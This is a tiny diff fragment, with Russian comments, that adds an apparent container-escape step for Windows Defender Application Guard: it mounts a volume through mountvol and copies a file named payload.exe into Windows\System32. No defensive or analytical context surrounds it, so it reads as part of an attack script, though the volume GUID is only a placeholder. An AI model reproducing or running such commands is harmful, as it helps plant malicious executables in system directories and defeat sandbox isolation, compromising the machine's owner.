@@ -1,0 +1,4 @@
+# Если включен WDAG, используем Container escape
+# Через mounted volumes
+mountvol X: \\?\Volume{GUID}\
+copy C:\temp\payload.exe X:\Windows\System32\
